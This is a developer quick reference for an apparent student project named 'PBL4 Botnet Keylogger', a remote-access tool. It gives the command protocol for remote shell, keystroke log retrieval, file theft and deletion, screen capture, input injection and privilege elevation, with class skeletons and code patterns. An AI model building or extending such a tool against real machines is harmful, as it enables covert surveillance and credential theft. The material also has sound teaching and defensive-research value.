# Quick Reference - PBL4 Botnet Keylogger

> 📚 Tài liệu tham khảo nhanh cho developers

## 🗺️ Roadmap Tài Liệu

### Bắt Đầu
1. **[README.md](./README.md)** - Đọc đầu tiên để có cái nhìn tổng quan
   - Giới thiệu project
   - Các chức năng chính
   - Cách build và chạy

### Hiểu Kiến Trúc
2. **[ARCHITECTURE.md](./ARCHITECTURE.md)** - Tài liệu chi tiết nhất
   - Kiến trúc Client (60+ trang)
   - Kiến trúc Server
   - Giao thức giao tiếp
   - Luồng hoạt động từng chức năng

### Xem Biểu Đồ
3. **[UML_DIAGRAMS.md](./UML_DIAGRAMS.md)** - Các biểu đồ UML
   - Class diagrams
   - Sequence diagrams
   - Component & Deployment diagrams

---

## 🎯 Packet ID Reference

### Client → Server Packets

| ID | Tên | Mô Tả | Data |
|----|-----|-------|------|
| 0x01 | IdentifyClientPacket | Định danh client | OS, IP, Username, Country, etc. |
| 0x02 | StatusClientPacket | Cập nhật status | Status message string |
| 0x03 | UserStatusClientPacket | Trạng thái user | Active/Idle enum |
| 0x10 | SystemInfoPacket (Response) | Thông tin hệ thống | CPU, RAM, Drives, etc. |
| 0x20 | RemoteShellPacket (Response) | Output của command | Command output string |
| 0x30 | GetProcessesPacket (Response) | Danh sách processes | Process[] array |
| 0x41 | GetDrivesPacket (Response) | Danh sách drives | Drive[] array |
| 0x42 | GetDirectoryPacket (Response) | Nội dung thư mục | FileSystemEntry[] array |
| 0x46 | FileTransferCompletePacket | Hoàn thành transfer | Transfer ID |
| 0x48 | FileTransferChunkPacket | Chunk data | Chunk sequence, data |
| 0x60 | KeyloggerLogsPacket (Response) | Logs directory | File list |
| 0x70 | GetDesktopPacket (Response) | Screenshot | JPEG image data |
| 0x71 | GetMonitorsPacket (Response) | Danh sách monitors | Monitor info |

### Server → Client Packets

| ID | Tên | Mô Tả | Data |
|----|-----|-------|------|
| 0x04 | ClientReconnectPacket | Yêu cầu reconnect | Empty |
| 0x05 | ClientDisconnectPacket | Yêu cầu disconnect | Empty |
| 0x06 | AskElevatePacket | Yêu cầu quyền admin | Empty |
| 0x07 | ShutdownActionPacket | Shutdown/Restart | Action enum |
| 0x10 | SystemInfoPacket (Request) | Request thông tin | Empty |
| 0x20 | RemoteShellPacket (Request) | Thực thi command | Command string |
| 0x30 | GetProcessesPacket (Request) | Request processes | Empty |
| 0x31 | ProcessActionPacket | Kill/Suspend process | PID, Action |
| 0x41 | GetDrivesPacket (Request) | Request drives | Empty |
| 0x42 | GetDirectoryPacket (Request) | Request directory | Path string |
| 0x43 | PathRenamePacket | Đổi tên file/folder | Old path, New path |
| 0x44 | PathDeletePacket | Xóa file/folder | Path string |
| 0x45 | FileTransferRequestPacket | Bắt đầu transfer | Transfer ID, Path, Type |
| 0x47 | FileTransferCancelPacket | Hủy transfer | Transfer ID |
| 0x50 | ShowMessageBoxPacket | Hiện message box | Caption, Text, Icon |
| 0x60 | KeyloggerLogsPacket (Request) | Request logs | Empty |
| 0x70 | GetDesktopPacket (Request) | Request screenshot | Monitor index, Quality |
| 0x72 | MouseEventPacket | Sự kiện chuột | X, Y, Action |
| 0x73 | KeyboardEventPacket | Sự kiện bàn phím | VK code, Flags |

---

## 🔧 Key Classes Reference

### Client Side

#### Client.Networking.Client
```csharp
class Client
{
    public bool Connected { get; }
    
    // Methods
    public void Connect(IPAddress ip, int port)
    public void SendPacket(IRequestPacket packet)
    public Task QueuePacketAsync(IRequestPacket packet)
    public void Disconnect()
    
    // Events
    public event ClientFailEventHandler ClientFail
    public event ClientStateEventHandler ClientState
}
```

#### ClientHandler
```csharp
class ClientHandler
{
    // Handlers (all private)
    private ClientServicesHandler _clientServicesHandler
    private SystemInfoHandler _systemInfoHandler
    private RemoteShellHandler _remoteShellHandler
    private TaskManagerHandler _taskManagerHandler
    private FileManagerHandler _fileManagerHandler
    private KeyloggerHandler _keyloggerHandler
    private RemoteDesktopHandler _remoteDesktopHandler
    
    // Main method
    public async Task HandlePackets(int id, byte[] data)
}
```

#### KeyloggerService
```csharp
class KeyloggerService
{
    private Keylogger _keylogger
    
    public void Start()  // Starts on separate thread
    public void Dispose()
}
```

#### ActivityDetection
```csharp
class ActivityDetection
{
    private UserStatus _lastUserStatus
    
    public void Start()  // Starts monitoring thread
    private bool IsUserIdle()  // Returns true if idle > 600s
}
```

### Server Side

#### ListenServer
```csharp
class ListenServer
{
    public int Port { get; }
    public bool Listening { get; }
    public List<Client> ConnectedClients { get; }
    
    // Methods
    public async Task RunAsync()  // Start listening
    public async Task StopAsync()  // Stop listening
    
    // Events
    public event ClientConnectedEventHandler ClientConnected
    public event ClientDisconnectedEventHandler ClientDisconnected
    public event StatusUpdatedEventHandler StatusUpdated
    public event UserStatusUpdatedEventHandler UserStatusUpdated
}
```

#### Server.Client
```csharp
class Client
{
    public bool Identified { get; set; }
    public IPEndPoint EndPoint { get; }
    public UserState Value { get; set; }
    public ClientHandler ClientHandler { get; }
    
    // Methods
    public async Task StartConnectionAsync()
    public void SendPacket(IRequestPacket packet)
    public Task<bool> QueuePacketAsync(IRequestPacket packet)
    public void Disconnect()
    
    // Event
    public event Action<Client> Disconnected
}
```

### Common

#### ProcessStream
```csharp
class ProcessStream
{
    // Writing
    public void Write(int id, byte[] data)
    
    // Reading
    public async Task<(int id, byte[] data)> ReadAsync()
}
```

#### Packet Base Classes
```csharp
interface IPacket { }

interface IRequestPacket : IPacket 
{
    int Id { get; }
}

class RequestPacket : IRequestPacket
{
    public byte[] Serialize()
    public static T Deserialize<T>(byte[] data)
}
```

---

## 📝 Common Patterns

### 1. Sending a Packet (Client or Server)
```csharp
// Async (preferred)
await client.QueuePacketAsync(new MyPacket 
{
    Property1 = value1,
    Property2 = value2
});

// Sync (blocking)
client.SendPacket(new MyPacket { ... });
```

### 2. Handling a Packet
```csharp
// In ClientHandler or Server.ClientHandler
public async Task HandlePackets(int id, byte[] data)
{
    switch (id)
    {
        case 0xNN:
            var packet = ResponsePacket.Deserialize<MyPacket>(data);
            await _handler.ProcessMyPacket(packet);
            break;
    }
}
```

### 3. Creating a New Packet Type
```csharp
// 1. Define packet class in Common
public class MyNewPacket : IRequestPacket
{
    public int Id => 0xNN;  // Choose unique ID
    public string SomeProperty { get; set; }
}

// 2. Add handler case in ClientHandler
case 0xNN:
    var packet = ResponsePacket.Deserialize<MyNewPacket>(data);
    await _myHandler.HandleMyPacket(packet);
    break;

// 3. Implement handler method
public async Task HandleMyPacket(MyNewPacket packet)
{
    // Process packet
    // Send response if needed
    await _client.QueuePacketAsync(new MyResponsePacket { ... });
}
```

### 4. File Transfer Pattern
```csharp
// Server initiates download
await client.QueuePacketAsync(new FileTransferRequestPacket
{
    TransferId = Guid.NewGuid().ToString(),
    Path = remotePath,
    Type = TransferType.Download
});

// Client sends chunks
const int CHUNK_SIZE = 65536; // 64KB
using var fs = File.OpenRead(path);
int sequence = 0;

while (true)
{
    var buffer = new byte[CHUNK_SIZE];
    var bytesRead = await fs.ReadAsync(buffer, 0, CHUNK_SIZE);
    
    await client.QueuePacketAsync(new FileTransferChunkPacket
    {
        TransferId = transferId,
        Sequence = sequence++,
        Data = buffer.Take(bytesRead).ToArray(),
        IsLastChunk = bytesRead < CHUNK_SIZE
    });
    
    if (bytesRead < CHUNK_SIZE) break;
}

// Send complete
await client.QueuePacketAsync(new FileTransferCompletePacket
{
    TransferId = transferId
});
```

### 5. Remote Desktop Streaming
```csharp
// Server requests frame (in timer tick)
await client.QueuePacketAsync(new GetDesktopPacket
{
    MonitorIndex = 0,
    Quality = 75  // JPEG quality 1-100
});

// Client captures and sends
var bitmap = ScreenHelper.CaptureScreen(monitorIndex);
var compressed = JpgCompression.Compress(bitmap, quality);

await client.QueuePacketAsync(new GetDesktopPacket
{
    MonitorIndex = monitorIndex,
    ImageData = compressed,
    Width = bitmap.Width,
    Height = bitmap.Height
});

// Server receives and displays
var ms = new MemoryStream(packet.ImageData);
var image = Image.FromStream(ms);
pictureBox.Image = image;
```

---

## 🐛 Debugging Tips

### 1. Connection Issues
```csharp
// Check if client connected
if (!client.Connected)
{
    Console.WriteLine("Not connected!");
}

// Monitor connection events
client.ClientState += (s, connected) => 
{
    Console.WriteLine($"Connection state: {connected}");
};
```

### 2. Packet Tracing
```csharp
// Add logging in ClientHandler.HandlePackets
Console.WriteLine($"Received packet ID: 0x{id:X2}");

// Monitor packet queue
Console.WriteLine($"Queue count: {packetQueue.Count}");
```

### 3. Network Monitoring
```bash
# Use Wireshark to capture traffic
# Filter: tcp.port == 10000

# Or use netstat
netstat -ano | findstr :10000
```

### 4. Common Errors

**"Port already in use"**
```csharp
// Server: Port 10000 is occupied
// Solution: Stop other instance or change port
ListenServer server = new ListenServer(10001);
```

**"Client not identified after 15s"**
```csharp
// Client didn't send IdentifyClientPacket in time
// Check: Network connectivity, firewall
// Debug: Add logging in Client.Connect()
```

**"Packet deserialization failed"**
```csharp
// Packet structure mismatch between Client and Server
// Solution: Rebuild both projects, ensure Common.dll is in sync
```

---

## 🔍 Code Navigation

### Find Handler for Packet ID
1. Look in `ClientHandler.HandlePackets()` or `Server.ClientHandler.HandlePackets()`
2. Find `case 0xNN:`
3. See which handler is called

### Find Packet Definition
1. Search in `Common/Networking/Packets/`
2. Or search for class name in solution

### Find Form for Feature
1. Look in `Server/Forms/`
2. Form names match features: `FrmRemoteDesktop`, `FrmFileManager`, etc.

### Trace Packet Flow
```
User Action (Server Form)
  ↓
Form creates packet
  ↓
client.QueuePacketAsync(packet)
  ↓
ProcessStream.Write(id, data)
  ↓
Network (TCP)
  ↓
ProcessStream.ReadAsync() → (id, data)
  ↓
ClientHandler.HandlePackets(id, data)
  ↓
Specific Handler.HandleXXX(packet)
  ↓
Process and optionally send response
```

---

## 📊 Performance Metrics

### Typical Values
- **Connection latency**: 10-50ms (LAN)
- **Packet overhead**: 5 bytes (1 byte ID + 4 bytes length)
- **Remote Desktop FPS**: 10-15 FPS @ 1920x1080 @ 75% quality
- **File transfer speed**: 5-10 MB/s (LAN, depends on chunk size and network)
- **Keylogger buffer**: Flush every 15s or 5MB
- **Activity detection interval**: Check every 1s, idle threshold 600s

### Memory Usage
- **Client**: ~50MB baseline
- **Server**: ~100MB + ~50MB per connected client
- **Remote Desktop**: +30-50MB per active session

---

## 🎓 Learning Resources

### Recommended Reading Order
1. README.md (30 minutes) - Overview
2. ARCHITECTURE.md Section 1-3 (2 hours) - Core concepts
3. UML_DIAGRAMS.md (1 hour) - Visual understanding
4. ARCHITECTURE.md Section 4-6 (3 hours) - Deep dive
5. Source code exploration (ongoing) - Implementation details

### Key Concepts to Understand
1. ✅ TCP Socket Communication
2. ✅ Binary Protocol Design (ProcessStream)
3. ✅ Async/Await Pattern
4. ✅ Windows Forms Event-Driven Programming
5. ✅ Windows API (P/Invoke)
6. ✅ Dataflow (BufferBlock, ActionBlock)
7. ✅ Thread Safety (ConcurrentHashSet, locks)

### Related Topics
- Network programming in C#
- Windows internals (hooks, process API)
- Image compression (JPEG)
- Binary serialization
- RAT architecture patterns

---

## 📞 Quick Help

**Q: Làm sao để thêm feature mới?**
A: 
1. Define packet trong Common
2. Add packet ID (chọn ID chưa dùng)
3. Add case trong ClientHandler (cả Client và Server)
4. Implement handler method
5. Create form (nếu cần UI)

**Q: Client không kết nối được?**
A:
1. Check Server đã chạy chưa
2. Check port 10000 available không
3. Check firewall settings
4. Check IP address trong Client.cs (default 127.0.0.1)

**Q: Làm sao debug packet flow?**
A:
1. Add Console.WriteLine trong HandlePackets
2. Use Wireshark để capture network traffic
3. Add breakpoints trong handlers
4. Check packet queue status

**Q: PlantUML diagrams không render?**
A:
1. Use online tool: http://www.plantuml.com/plantuml/uml/
2. Install VS Code extension: "PlantUML"
3. Install PlantUML CLI: java -jar plantuml.jar file.puml

---

**💡 Pro Tip**: Luôn đọc ARCHITECTURE.md để hiểu flow trước khi đọc code!
